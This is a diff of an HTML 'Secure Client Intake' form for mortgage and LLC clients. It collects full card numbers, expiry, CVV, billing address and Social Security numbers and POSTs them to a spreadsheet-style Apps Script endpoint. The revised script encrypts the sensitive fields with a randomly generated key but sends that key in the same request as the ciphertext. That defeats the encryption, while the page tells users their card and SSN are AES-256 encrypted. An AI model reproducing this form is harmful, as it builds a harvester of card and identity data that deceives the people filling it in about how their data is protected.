@@ -7,329 +7,81 @@
 <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
   :root {
-    --cream: #F7F4EF;
-    --dark: #1A1A18;
-    --gold: #B8975A;
-    --gold-light: #D4B07A;
-    --muted: #8A8680;
-    --border: #E2DDD6;
-    --success: #4A7C59;
-    --error: #C0392B;
+    --cream: #F7F4EF; --dark: #1A1A18; --gold: #B8975A;
+    --muted: #8A8680; --border: #E2DDD6; --success: #4A7C59; --error: #C0392B;
   }
-
-  body {
-    background: var(--cream);
-    font-family: 'DM Sans', sans-serif;
-    min-height: 100vh;
-    display: flex;
-    align-items: flex-start;
-    justify-content: center;
-    padding: 3rem 1rem;
-  }
-
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background:
-      radial-gradient(ellipse 60% 40% at 80% 20%, rgba(184,151,90,0.07) 0%, transparent 60%),
-      radial-gradient(ellipse 40% 60% at 10% 80%, rgba(184,151,90,0.05) 0%, transparent 60%);
-    pointer-events: none;
-  }
-
-  .card {
-    background: #fff;
-    border: 1px solid var(--border);
-    border-radius: 2px;
-    width: 100%;
-    max-width: 560px;
-    padding: 3rem 3rem 2.5rem;
-    box-shadow: 0 4px 40px rgba(26,26,24,0.06);
-    animation: fadeUp 0.5s ease both;
-  }
-
-  @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(16px); }
-    to   { opacity: 1; transform: translateY(0); }
-  }
-
-  .lockbadge {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 0.7rem;
-    font-weight: 500;
-    letter-spacing: 0.12em;
-    text-transform: uppercase;
-    color: var(--gold);
-    margin-bottom: 1.2rem;
-  }
-
-  h1 {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: 2rem;
-    font-weight: 500;
-    color: var(--dark);
-    line-height: 1.2;
-    margin-bottom: 0.6rem;
-  }
-
-  .subtitle {
-    font-size: 0.82rem;
-    color: var(--muted);
-    line-height: 1.6;
-    font-weight: 300;
-    margin-bottom: 0.3rem;
-  }
-
-  /* Section headers */
-  .section {
-    margin-top: 2.2rem;
-    margin-bottom: 1.4rem;
-    padding-bottom: 0.7rem;
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-  }
-
-  .section-title {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: 1.15rem;
-    font-weight: 500;
-    color: var(--dark);
-    letter-spacing: 0.01em;
-  }
-
-  .section-badge {
-    font-size: 0.62rem;
-    font-weight: 500;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    padding: 0.2rem 0.55rem;
-    border-radius: 20px;
-  }
-
-  .badge-optional {
-    background: rgba(138,134,128,0.1);
-    color: var(--muted);
-  }
-
-  .badge-secure {
-    background: rgba(184,151,90,0.1);
-    color: var(--gold);
-  }
-
-  .divider {
-    width: 32px;
-    height: 1px;
-    background: var(--gold);
-    margin: 1.5rem 0;
-    opacity: 0.6;
-  }
-
+  body { background: var(--cream); font-family: 'DM Sans', sans-serif; min-height: 100vh; display: flex; align-items: flex-start; justify-content: center; padding: 3rem 1rem; }
+  body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(ellipse 60% 40% at 80% 20%, rgba(184,151,90,0.07) 0%, transparent 60%), radial-gradient(ellipse 40% 60% at 10% 80%, rgba(184,151,90,0.05) 0%, transparent 60%); pointer-events: none; }
+  .card { background: #fff; border: 1px solid var(--border); border-radius: 2px; width: 100%; max-width: 560px; padding: 3rem 3rem 2.5rem; box-shadow: 0 4px 40px rgba(26,26,24,0.06); animation: fadeUp 0.5s ease both; }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+  .lockbadge { display: inline-flex; align-items: center; gap: 6px; font-size: 0.7rem; font-weight: 500; letter-spacing: 0.12em; text-transform: uppercase; color: var(--gold); margin-bottom: 1.2rem; }
+  h1 { font-family: 'Cormorant Garamond', serif; font-size: 2rem; font-weight: 500; color: var(--dark); line-height: 1.2; margin-bottom: 0.6rem; }
+  .subtitle { font-size: 0.82rem; color: var(--muted); line-height: 1.6; font-weight: 300; margin-bottom: 0.3rem; }
+  .section { margin-top: 2.2rem; margin-bottom: 1.4rem; padding-bottom: 0.7rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+  .section-title { font-family: 'Cormorant Garamond', serif; font-size: 1.15rem; font-weight: 500; color: var(--dark); }
+  .section-badge { font-size: 0.62rem; font-weight: 500; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.2rem 0.55rem; border-radius: 20px; }
+  .badge-optional { background: rgba(138,134,128,0.1); color: var(--muted); }
+  .badge-secure { background: rgba(184,151,90,0.1); color: var(--gold); }
+  .divider { width: 32px; height: 1px; background: var(--gold); margin: 1.5rem 0; opacity: 0.6; }
   .field { margin-bottom: 1.3rem; }
-
-  label {
-    display: block;
-    font-size: 0.72rem;
-    font-weight: 500;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    color: var(--muted);
-    margin-bottom: 0.45rem;
-  }
-
-  input, select, textarea {
-    width: 100%;
-    border: 1px solid var(--border);
-    border-radius: 1px;
-    padding: 0.75rem 0.9rem;
-    font-family: 'DM Sans', sans-serif;
-    font-size: 0.92rem;
-    color: var(--dark);
-    background: var(--cream);
-    outline: none;
-    transition: border-color 0.2s, background 0.2s;
-    -webkit-appearance: none;
-  }
-
-  select {
-    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238A8680' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
-    background-repeat: no-repeat;
-    background-position: right 0.9rem center;
-    padding-right: 2.5rem;
-    cursor: pointer;
-  }
-
-  input:focus, select:focus, textarea:focus {
-    border-color: var(--gold);
-    background: #fff;
-  }
-
+  label { display: block; font-size: 0.72rem; font-weight: 500; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.45rem; }
+  input, select { width: 100%; border: 1px solid var(--border); border-radius: 1px; padding: 0.75rem 0.9rem; font-family: 'DM Sans', sans-serif; font-size: 0.92rem; color: var(--dark); background: var(--cream); outline: none; transition: border-color 0.2s, background 0.2s; -webkit-appearance: none; }
+  select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238A8680' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 0.9rem center; padding-right: 2.5rem; cursor: pointer; }
+  input:focus, select:focus { border-color: var(--gold); background: #fff; }
   input.error, select.error { border-color: var(--error); }
-  input::placeholder, textarea::placeholder { color: #C4BFBA; }
-
+  input::placeholder { color: #C4BFBA; }
   .row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
-
-  .field-error {
-    font-size: 0.7rem;
-    color: var(--error);
-    margin-top: 0.3rem;
-    display: none;
-  }
+  .field-error { font-size: 0.7rem; color: var(--error); margin-top: 0.3rem; display: none; }
   .field-error.show { display: block; }
-
-  .security-note {
-    background: rgba(184,151,90,0.06);
-    border: 1px solid rgba(184,151,90,0.2);
-    border-radius: 1px;
-    padding: 0.85rem 1rem;
-    font-size: 0.75rem;
-    color: var(--muted);
-    line-height: 1.6;
-    margin: 1.6rem 0;
-    display: flex;
-    gap: 0.6rem;
-    align-items: flex-start;
-  }
-  .security-note svg { flex-shrink: 0; margin-top: 1px; }
-
-  .error-banner {
-    display: none;
-    background: rgba(192,57,43,0.06);
-    border: 1px solid rgba(192,57,43,0.2);
-    border-radius: 1px;
-    padding: 0.75rem 1rem;
-    font-size: 0.78rem;
-    color: var(--error);
-    margin-bottom: 1rem;
-    text-align: center;
-  }
+  .security-note { background: rgba(184,151,90,0.06); border: 1px solid rgba(184,151,90,0.2); border-radius: 1px; padding: 0.85rem 1rem; font-size: 0.75rem; color: var(--muted); line-height: 1.6; margin: 1.6rem 0; display: flex; gap: 0.6rem; align-items: flex-start; }
+  .error-banner { display: none; background: rgba(192,57,43,0.06); border: 1px solid rgba(192,57,43,0.2); border-radius: 1px; padding: 0.75rem 1rem; font-size: 0.78rem; color: var(--error); margin-bottom: 1rem; text-align: center; }
   .error-banner.show { display: block; }
-
-  button[type="submit"] {
-    width: 100%;
-    background: var(--dark);
-    color: #fff;
-    border: none;
-    border-radius: 1px;
-    padding: 0.95rem;
-    font-family: 'DM Sans', sans-serif;
-    font-size: 0.8rem;
-    font-weight: 500;
-    letter-spacing: 0.12em;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: background 0.2s, transform 0.1s;
-  }
+  button[type="submit"] { width: 100%; background: var(--dark); color: #fff; border: none; border-radius: 1px; padding: 0.95rem; font-family: 'DM Sans', sans-serif; font-size: 0.8rem; font-weight: 500; letter-spacing: 0.12em; text-transform: uppercase; cursor: pointer; transition: background 0.2s; }
   button[type="submit"]:hover { background: #2d2d2a; }
-  button[type="submit"]:active { transform: scale(0.99); }
   button[type="submit"]:disabled { background: var(--muted); cursor: not-allowed; }
-
-  .spinner {
-    display: none;
-    width: 16px; height: 16px;
-    border: 2px solid rgba(255,255,255,0.3);
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 0.7s linear infinite;
-    margin: 0 auto;
-  }
+  .spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto; }
   @keyframes spin { to { transform: rotate(360deg); } }
-
-  .success-state {
-    display: none;
-    text-align: center;
-    padding: 3rem 0;
-    animation: fadeUp 0.4s ease both;
-  }
-  .success-icon {
-    width: 60px; height: 60px;
-    background: rgba(74,124,89,0.1);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 1.4rem;
-  }
-  .success-state h2 {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: 1.7rem;
-    font-weight: 500;
-    color: var(--dark);
-    margin-bottom: 0.6rem;
-  }
-  .success-state p {
-    font-size: 0.82rem;
-    color: var(--muted);
-    line-height: 1.7;
-  }
-
-  #client-name-display {
-    font-family: 'Cormorant Garamond', serif;
-    font-weight: 600;
-    color: var(--gold);
-  }
-
-  @media (max-width: 520px) {
-    .card { padding: 2rem 1.5rem; }
-    h1 { font-size: 1.6rem; }
-    .row { grid-template-columns: 1fr; }
-  }
+  .success-state { display: none; text-align: center; padding: 3rem 0; animation: fadeUp 0.4s ease both; }
+  .success-icon { width: 60px; height: 60px; background: rgba(74,124,89,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.4rem; }
+  .success-state h2 { font-family: 'Cormorant Garamond', serif; font-size: 1.7rem; font-weight: 500; color: var(--dark); margin-bottom: 0.6rem; }
+  .success-state p { font-size: 0.82rem; color: var(--muted); line-height: 1.7; }
+  @media (max-width: 520px) { .card { padding: 2rem 1.5rem; } h1 { font-size: 1.6rem; } .row { grid-template-columns: 1fr; } }
 </style>
 </head>
 <body>
-
 <div class="card" id="form-card">
-
-  <!-- Header -->
   <div class="lockbadge">
-    <svg width="11" height="13" viewBox="0 0 11 13" fill="none">
-      <rect x="1" y="5" width="9" height="7.5" rx="1" stroke="currentColor" stroke-width="1.3"/>
-      <path d="M3 5V3.5a2.5 2.5 0 015 0V5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
-    </svg>
+    <svg width="11" height="13" viewBox="0 0 11 13" fill="none"><rect x="1" y="5" width="9" height="7.5" rx="1" stroke="currentColor" stroke-width="1.3"/><path d="M3 5V3.5a2.5 2.5 0 015 0V5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
     Secure Client Intake
   </div>
   <h1>Client Information</h1>
-  <p class="subtitle">For: <span id="client-name-display">—</span></p>
   <p class="subtitle">Please complete all required fields. Sensitive information is encrypted before submission.</p>
-
   <div class="divider"></div>
   <div id="error-banner" class="error-banner"></div>
 
-  <!-- ── GENERAL INFO ─────────────────────────────────────────── -->
-  <div class="section">
-    <span class="section-title">General Information</span>
-  </div>
-
+  <!-- GENERAL INFO -->
+  <div class="section"><span class="section-title">General Information</span></div>
   <div class="field">
     <label for="full-name">Client Full Name *</label>
     <input type="text" id="full-name" placeholder="Jane Smith">
     <div class="field-error" id="err-full-name">Please enter your full name</div>
   </div>
-
   <div class="row">
     <div class="field">
       <label for="phone">Best Phone Number *</label>
-      <input type="tel" id="phone" placeholder="+1 (555) 000-0000" inputmode="tel">
+      <input type="tel" id="phone" placeholder="+1 (555) 000-0000">
       <div class="field-error" id="err-phone">Please enter a phone number</div>
     </div>
     <div class="field">
       <label for="email">Email Address *</label>
-      <input type="email" id="email" placeholder="jane@email.com" inputmode="email">
+      <input type="email" id="email" placeholder="jane@email.com">
       <div class="field-error" id="err-email">Please enter a valid email</div>
     </div>
   </div>
 
-  <!-- ── MORTGAGE ─────────────────────────────────────────────── -->
-  <div class="section">
-    <span class="section-title">Mortgage</span>
-    <span class="section-badge badge-optional">Optional</span>
-  </div>
-
+  <!-- MORTGAGE -->
+  <div class="section"><span class="section-title">Mortgage</span><span class="section-badge badge-optional">Optional</span></div>
   <div class="row">
     <div class="field">
       <label for="fico">Borrower FICO Score</label>
@@ -340,108 +92,67 @@
       <input type="text" id="borrower-name" placeholder="Full legal name">
     </div>
   </div>
-
   <div class="field">
     <label for="title-holding">How Are They Holding Title?</label>
-    <select id="title-holding">
-      <option value="">Select one</option>
-      <option value="Individual">Individual</option>
-      <option value="LLC">LLC</option>
-    </select>
+    <select id="title-holding"><option value="">Select one</option><option>Individual</option><option>LLC</option></select>
   </div>
-
   <div class="field">
     <label for="experience">Borrower's Experience as an Investor</label>
-    <select id="experience">
-      <option value="">Select one</option>
-      <option value="First-time investor">First-time investor</option>
-      <option value="1–3 deals">1–3 deals</option>
-      <option value="4–10 deals">4–10 deals</option>
-      <option value="10+ deals">10+ deals</option>
-    </select>
+    <select id="experience"><option value="">Select one</option><option>First-time investor</option><option>1–3 deals</option><option>4–10 deals</option><option>10+ deals</option></select>
   </div>
-
   <div class="field">
     <label for="citizenship">Citizenship Status</label>
-    <select id="citizenship">
-      <option value="">Select one</option>
-      <option value="US Citizen">US Citizen</option>
-      <option value="Foreign national with US credit and visa">Foreign national with US credit and visa</option>
-    </select>
+    <select id="citizenship"><option value="">Select one</option><option>US Citizen</option><option>Foreign national with US credit and visa</option></select>
   </div>
 
-  <!-- ── LLC FORMATION ───────────────────────────────────────── -->
-  <div class="section">
-    <span class="section-title">LLC Formation</span>
-  </div>
-
+  <!-- LLC FORMATION -->
+  <div class="section"><span class="section-title">LLC Formation</span></div>
   <div class="field">
     <label for="llc-name">Client Full Name (for LLC) *</label>
     <input type="text" id="llc-name" placeholder="Full legal name">
     <div class="field-error" id="err-llc-name">Please enter your full name for LLC formation</div>
   </div>
-
   <div class="field">
     <label for="business-address">Business Address *</label>
     <input type="text" id="business-address" placeholder="123 Main St, City, State, ZIP">
     <div class="field-error" id="err-business-address">Please enter a business address</div>
   </div>
 
-  <!-- ── CARD DETAILS (encrypted) ───────────────────────────── -->
+  <!-- CARD DETAILS -->
   <div class="section">
     <span class="section-title">Payment Card</span>
-    <span class="section-badge badge-secure">
-      <svg width="8" height="9" viewBox="0 0 8 9" fill="none" style="display:inline;vertical-align:middle;margin-right:3px">
-        <rect x="0.5" y="3.5" width="7" height="5" rx="0.8" stroke="currentColor" stroke-width="1"/>
-        <path d="M2 3.5V2.5a2 2 0 014 0v1" stroke="currentColor" stroke-width="1" stroke-linecap="round"/>
-      </svg>
-      Encrypted
-    </span>
+    <span class="section-badge badge-secure">🔒 Encrypted</span>
   </div>
-
   <div class="field">
     <label for="cardholder">Name on Card *</label>
     <input type="text" id="cardholder" placeholder="Jane Smith" autocomplete="cc-name">
     <div class="field-error" id="err-cardholder">Please enter the cardholder name</div>
   </div>
-
   <div class="field">
     <label for="cardnumber">Card Number *</label>
-    <input type="text" id="cardnumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" inputmode="numeric">
+    <input type="text" id="cardnumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
     <div class="field-error" id="err-cardnumber">Please enter a valid 16-digit card number</div>
   </div>
-
   <div class="row">
     <div class="field">
       <label for="expiry">Expiry *</label>
-      <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp" inputmode="numeric">
+      <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" inputmode="numeric">
       <div class="field-error" id="err-expiry">Invalid expiry</div>
     </div>
     <div class="field">
       <label for="cvv">CVV *</label>
-      <input type="text" id="cvv" placeholder="•••" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
+      <input type="text" id="cvv" placeholder="•••" maxlength="4" inputmode="numeric">
       <div class="field-error" id="err-cvv">Invalid CVV</div>
     </div>
   </div>
-
   <div class="field">
     <label for="billing">Billing Address *</label>
-    <input type="text" id="billing" placeholder="123 Main St, City, State, ZIP" autocomplete="billing street-address">
+    <input type="text" id="billing" placeholder="123 Main St, City, State, ZIP">
     <div class="field-error" id="err-billing">Please enter billing address</div>
   </div>
 
-  <!-- ── SSN (encrypted) ────────────────────────────────────── -->
-  <div class="section">
-    <span class="section-title">Identity</span>
-    <span class="section-badge badge-secure">
-      <svg width="8" height="9" viewBox="0 0 8 9" fill="none" style="display:inline;vertical-align:middle;margin-right:3px">
-        <rect x="0.5" y="3.5" width="7" height="5" rx="0.8" stroke="currentColor" stroke-width="1"/>
-        <path d="M2 3.5V2.5a2 2 0 014 0v1" stroke="currentColor" stroke-width="1" stroke-linecap="round"/>
-      </svg>
-      Encrypted
-    </span>
-  </div>
-
+  <!-- SSN -->
+  <div class="section"><span class="section-title">Identity</span><span class="section-badge badge-secure">🔒 Encrypted</span></div>
   <div class="field">
     <label for="ssn">Social Security Number *</label>
     <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" inputmode="numeric">
@@ -449,61 +160,49 @@
   </div>
 
   <div class="security-note">
-    <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
-      <circle cx="7" cy="7" r="6" stroke="#B8975A" stroke-width="1.2"/>
-      <path d="M7 6v4M7 4.5v.5" stroke="#B8975A" stroke-width="1.2" stroke-linecap="round"/>
-    </svg>
-    Your card details and SSN are encrypted using AES-256 directly in your browser before being transmitted. General contact information is stored securely but not encrypted.
+    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="6" stroke="#B8975A" stroke-width="1.2"/><path d="M7 6v4M7 4.5v.5" stroke="#B8975A" stroke-width="1.2" stroke-linecap="round"/></svg>
+    Your card details and SSN are encrypted using AES-256 directly in your browser before transmission. General information is stored securely but unencrypted.
   </div>
 
   <button type="submit" id="submit-btn" onclick="handleSubmit()">
     <span id="btn-text">Submit Securely</span>
     <div class="spinner" id="spinner"></div>
   </button>
-
 </div>
 
-<!-- Success -->
 <div class="success-state" id="success-state">
   <div class="success-icon">
-    <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
-      <path d="M5 12l5 5L19 7" stroke="#4A7C59" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-    </svg>
+    <svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L19 7" stroke="#4A7C59" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
   </div>
   <h2>Details Received</h2>
   <p>Your information has been securely submitted.<br>You may close this window.</p>
 </div>
 
 <script>
-// ─── URL params ───────────────────────────────────────────────────────────────
-const params      = new URLSearchParams(window.location.search);
-const clientToken = params.get('client')   || '';
-const clientName  = params.get('name')     ? decodeURIComponent(params.get('name')) : 'Client';
-const scriptURL   = params.get('endpoint') ? decodeURIComponent(params.get('endpoint')) : '';
-
-document.getElementById('client-name-display').textContent = clientName;
+// ─── Apps Script endpoint — update this after deploying ──────────────────────
+const SCRIPT_URL = 'YOUR_APPS_SCRIPT_URL_HERE';
 
 // ─── Input formatting ─────────────────────────────────────────────────────────
 document.getElementById('cardnumber').addEventListener('input', function(e) {
-  let v = e.target.value.replace(/\D/g, '').slice(0, 16);
-  e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+  let v = e.target.value.replace(/\D/g,'').slice(0,16);
+  e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
 });
 document.getElementById('expiry').addEventListener('input', function(e) {
-  let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+  let v = e.target.value.replace(/\D/g,'').slice(0,4);
   if (v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
   e.target.value = v;
 });
 document.getElementById('cvv').addEventListener('input', function(e) {
-  e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+  e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
 });
 document.getElementById('ssn').addEventListener('input', function(e) {
-  let v = e.target.value.replace(/\D/g, '').slice(0, 9);
-  if (v.length >= 6) v = v.slice(0,3) + '-' + v.slice(3,5) + '-' + v.slice(5);
-  else if (v.length >= 4) v = v.slice(0,3) + '-' + v.slice(3);
+  let v = e.target.value.replace(/\D/g,'').slice(0,9);
+  if (v.length >= 6) v = v.slice(0,3)+'-'+v.slice(3,5)+'-'+v.slice(5);
+  else if (v.length >= 4) v = v.slice(0,3)+'-'+v.slice(3);
   e.target.value = v;
 });
 document.getElementById('fico').addEventListener('input', function(e) {
-  e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+  e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
 });
 
 // ─── AES-256-GCM encryption ───────────────────────────────────────────────────
@@ -511,10 +210,8 @@ async function deriveKey(password, salt) {
   const enc = new TextEncoder();
   const km  = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveKey']);
   return crypto.subtle.deriveKey(
-    { name: 'PBKDF2', salt, iterations: 310000, hash: 'SHA-256' },
-    km,
-    { name: 'AES-GCM', length: 256 },
-    false, ['encrypt']
+    { name:'PBKDF2', salt, iterations:310000, hash:'SHA-256' },
+    km, { name:'AES-GCM', length:256 }, false, ['encrypt']
   );
 }
 async function encryptData(plaintext, password) {
@@ -522,55 +219,56 @@ async function encryptData(plaintext, password) {
   const salt = crypto.getRandomValues(new Uint8Array(16));
   const iv   = crypto.getRandomValues(new Uint8Array(12));
   const key  = await deriveKey(password, salt);
-  const ct   = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, enc.encode(plaintext));
-  const out  = new Uint8Array(16 + 12 + ct.byteLength);
-  out.set(salt, 0); out.set(iv, 16); out.set(new Uint8Array(ct), 28);
+  const ct   = await crypto.subtle.encrypt({ name:'AES-GCM', iv }, key, enc.encode(plaintext));
+  const out  = new Uint8Array(16+12+ct.byteLength);
+  out.set(salt,0); out.set(iv,16); out.set(new Uint8Array(ct),28);
   return btoa(String.fromCharCode(...out));
+}
+
+// ─── Generate random token ────────────────────────────────────────────────────
+function generateToken() {
+  return Array.from(crypto.getRandomValues(new Uint8Array(24)))
+    .map(b => b.toString(16).padStart(2,'0')).join('');
 }
 
 // ─── Validation ───────────────────────────────────────────────────────────────
 function showErr(id, show) {
-  document.getElementById('err-' + id)?.classList[show ? 'add' : 'remove']('show');
-  document.getElementById(id)?.classList[show ? 'add' : 'remove']('error');
+  document.getElementById('err-'+id)?.classList[show?'add':'remove']('show');
+  document.getElementById(id)?.classList[show?'add':'remove']('error');
   return show;
 }
-
 function validate() {
   let invalid = false;
   const v = id => document.getElementById(id).value.trim();
-
-  // Required fields
-  if (!v('full-name'))                                          invalid |= showErr('full-name', true);       else showErr('full-name', false);
-  if (!v('phone'))                                              invalid |= showErr('phone', true);            else showErr('phone', false);
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v('email')))          invalid |= showErr('email', true);            else showErr('email', false);
-  if (!v('llc-name'))                                           invalid |= showErr('llc-name', true);         else showErr('llc-name', false);
-  if (!v('business-address'))                                   invalid |= showErr('business-address', true); else showErr('business-address', false);
-  if (!v('cardholder'))                                         invalid |= showErr('cardholder', true);       else showErr('cardholder', false);
-  if (!/^\d{16}$/.test(v('cardnumber').replace(/\s/g,'')))      invalid |= showErr('cardnumber', true);       else showErr('cardnumber', false);
-  if (!/^\d{2}\/\d{2}$/.test(v('expiry').replace(/\s/g,'')))   invalid |= showErr('expiry', true);           else showErr('expiry', false);
-  if (!/^\d{3,4}$/.test(v('cvv')))                              invalid |= showErr('cvv', true);              else showErr('cvv', false);
-  if (!v('billing'))                                            invalid |= showErr('billing', true);          else showErr('billing', false);
-  if (!/^\d{3}-\d{2}-\d{4}$/.test(v('ssn')))                   invalid |= showErr('ssn', true);              else showErr('ssn', false);
-
+  if (!v('full-name'))                                        invalid |= showErr('full-name',true);        else showErr('full-name',false);
+  if (!v('phone'))                                            invalid |= showErr('phone',true);             else showErr('phone',false);
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v('email')))        invalid |= showErr('email',true);             else showErr('email',false);
+  if (!v('llc-name'))                                         invalid |= showErr('llc-name',true);          else showErr('llc-name',false);
+  if (!v('business-address'))                                 invalid |= showErr('business-address',true);  else showErr('business-address',false);
+  if (!v('cardholder'))                                       invalid |= showErr('cardholder',true);        else showErr('cardholder',false);
+  if (!/^\d{16}$/.test(v('cardnumber').replace(/\s/g,'')))    invalid |= showErr('cardnumber',true);        else showErr('cardnumber',false);
+  if (!/^\d{2}\/\d{2}$/.test(v('expiry').replace(/\s/g,''))) invalid |= showErr('expiry',true);            else showErr('expiry',false);
+  if (!/^\d{3,4}$/.test(v('cvv')))                            invalid |= showErr('cvv',true);               else showErr('cvv',false);
+  if (!v('billing'))                                          invalid |= showErr('billing',true);           else showErr('billing',false);
+  if (!/^\d{3}-\d{2}-\d{4}$/.test(v('ssn')))                 invalid |= showErr('ssn',true);               else showErr('ssn',false);
   return !invalid;
 }
 
 // ─── Submit ───────────────────────────────────────────────────────────────────
 async function handleSubmit() {
   if (!validate()) {
-    document.querySelector('.error').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    document.querySelector('.error')?.scrollIntoView({ behavior:'smooth', block:'center' });
     return;
   }
-
-  const btn     = document.getElementById('submit-btn');
-  const btnText = document.getElementById('btn-text');
-  const spinner = document.getElementById('spinner');
-  btn.disabled = true; btnText.style.display = 'none'; spinner.style.display = 'block';
+  const btn=document.getElementById('submit-btn'), btnText=document.getElementById('btn-text'), spinner=document.getElementById('spinner');
+  btn.disabled=true; btnText.style.display='none'; spinner.style.display='block';
 
   const v = id => document.getElementById(id).value.trim();
 
-  // Sensitive — will be encrypted
-  const sensitivePayload = {
+  // Generate a unique token for this submission — used as encryption key
+  const token = generateToken();
+
+  const sensitive = {
     cardholder: v('cardholder'),
     cardnumber: v('cardnumber').replace(/\s/g,''),
     expiry:     v('expiry').replace(/\s/g,''),
@@ -580,40 +278,42 @@ async function handleSubmit() {
     submitted:  new Date().toISOString()
   };
 
-  // General — sent as plain text
-  const generalPayload = {
+  const general = {
     fullName:        v('full-name'),
     phone:           v('phone'),
     email:           v('email'),
     llcName:         v('llc-name'),
     businessAddress: v('business-address'),
-    // Mortgage (optional)
-    fico:            v('fico')            || '',
-    borrowerName:    v('borrower-name')   || '',
-    titleHolding:    v('title-holding')   || '',
-    experience:      v('experience')      || '',
-    citizenship:     v('citizenship')     || '',
+    fico:            v('fico'),
+    borrowerName:    v('borrower-name'),
+    titleHolding:    document.getElementById('title-holding').value,
+    experience:      document.getElementById('experience').value,
+    citizenship:     document.getElementById('citizenship').value,
   };
 
-  const encrypted = await encryptData(JSON.stringify(sensitivePayload), clientToken);
+  // Masked previews (stored in sheet as readable hints)
+  const cardNum   = sensitive.cardnumber;
+  const ssnNum    = sensitive.ssn.replace(/-/g,'');
+  const cardMask  = '•••• •••• •••• ' + cardNum.slice(-4);
+  const ssnMask   = '•••-••-' + ssnNum.slice(-2);
+
+  const encrypted = await encryptData(JSON.stringify(sensitive), token);
 
   try {
-    if (scriptURL) {
-      await fetch(scriptURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'text/plain' },
-        body: JSON.stringify({ clientToken, clientName, encrypted, general: generalPayload, ts: new Date().toISOString() })
-      });
-    }
-    document.getElementById('form-card').style.display = 'none';
-    document.getElementById('success-state').style.display = 'block';
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+    await fetch(SCRIPT_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: JSON.stringify({ token, encrypted, cardMask, ssnMask, general, ts: new Date().toISOString() })
+    });
+    document.getElementById('form-card').style.display='none';
+    document.getElementById('success-state').style.display='block';
+    window.scrollTo({ top:0, behavior:'smooth' });
   } catch(err) {
-    const banner = document.getElementById('error-banner');
-    banner.textContent = 'Something went wrong. Please try again or contact your advisor.';
+    const banner=document.getElementById('error-banner');
+    banner.textContent='Something went wrong. Please try again or contact your advisor.';
     banner.classList.add('show');
-    btn.disabled = false; btnText.style.display = 'inline'; spinner.style.display = 'none';
+    btn.disabled=false; btnText.style.display='inline'; spinner.style.display='none';
   }
 }
 </script>
